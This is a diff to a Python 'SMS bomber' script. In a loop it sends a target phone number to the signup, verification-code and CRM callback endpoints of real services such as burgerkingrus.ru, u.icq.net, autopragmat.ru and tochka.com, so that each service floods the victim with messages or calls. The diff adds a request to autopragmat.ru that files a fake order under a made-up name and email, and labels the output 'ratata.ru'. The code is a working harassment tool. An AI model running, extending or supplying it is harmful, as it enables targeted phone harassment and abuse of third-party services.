@@ -1,6 +1,7 @@
 from banners import *
 from formats import *
-import os, sys
+import os
+import sys
 import requests
 import fake_useragent
 import time
@@ -15,7 +16,7 @@ while True:
             print("Wrong format")
         else:
             break
-    print(NUMBER)
+    print(f"{NUMBER} selected as target number.")
 
     while True:
         try:
@@ -54,7 +55,8 @@ while True:
 
         try:
             response = requests.post('https://burgerkingrus.ru/user/v3/auth/signup',
-                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}", "invite": ""}, timeout=5.05)
+                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}", "invite": ""},
+                                     timeout=5.05)
             print("[+] burgerkingrus.ru")
         except Exception as ex:
             print(f"ERROR: {ex}")
@@ -68,10 +70,21 @@ while True:
         try:
             response = requests.post('https://u.icq.net/api/v92/rapi/auth/sendCode',
                                      headers=HEADERS, json={"reqId": "81625-1703181748",
-                                                            "params": {"phone": f"{format_plus(NUMBER)}", "language": "en-US",
+                                                            "params": {"phone": f"{format_plus(NUMBER)}",
+                                                                       "language": "en-US",
                                                                        "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                                                        "application": "icq"}}, timeout=5.05)
             print("[+] u.icq.net")
+        except Exception as ex:
+            print(f'ERROR: {ex}')
+
+        try:
+            response = requests.post('https://autopragmat.ru/api/v1/send-order/',
+                                     headers=HEADERS,
+                                     data={"name": "Константин",
+                                           "tel": f"{format_plus_8(NUMBER)}",
+                                           "email": "konstantin_kolyasnikov@yandex.ru", "program": "All"})
+            print("[+] ratata.ru")
         except Exception as ex:
             print(f'ERROR: {ex}')
 
@@ -107,7 +120,10 @@ while True:
         try:
             response = requests.post('https://tochka.com/api/v1/crm/request',
                                      headers=HEADERS,
-                                     json={"url_path": "/", "phone": f"{format_spaces(NUMBER)}", "inn": "", "clientname": "", "comment": "", "city": "", "crm_type": "signup", "product": False, "yandex_uid": None, "advid": "", "page_description": "Главная страница сайта", "agree_to_receive_ad":True})
+                                     json={"url_path": "/", "phone": f"{format_spaces(NUMBER)}", "inn": "",
+                                           "clientname": "", "comment": "", "city": "", "crm_type": "signup",
+                                           "product": False, "yandex_uid": None, "advid": "",
+                                           "page_description": "Главная страница сайта", "agree_to_receive_ad": True})
             print("[+] tochka.com")
         except Exception as ex:
             print(f'ERROR: {ex}')
